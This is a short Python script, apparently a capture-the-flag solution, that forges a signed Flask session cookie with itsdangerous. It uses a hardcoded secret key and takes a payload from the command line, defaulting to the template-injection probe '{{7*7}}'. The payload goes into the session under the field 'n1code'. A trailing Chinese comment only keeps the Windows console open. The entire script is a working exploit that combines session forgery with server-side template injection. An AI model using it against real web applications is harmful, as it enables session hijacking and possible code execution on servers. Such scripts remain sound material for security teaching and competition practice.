import sys
from itsdangerous import URLSafeTimedSerializer

if len(sys.argv) > 1:
    payload = sys.argv[1]
else:
    payload = "{{7*7}}"

key = 'Drmhze6EPcv0fN_81Bj-nA'
s = URLSafeTimedSerializer(key, salt='cookie-session',
                           signer_kwargs={'key_derivation': 'hmac'})
print(s.dumps({'n1code': payload}))

# 防闪退：Windows 双击运行完别闪关，按任意键退出
print("\n按任意键退出...")
try:
    input()
except EOFError:
    pass
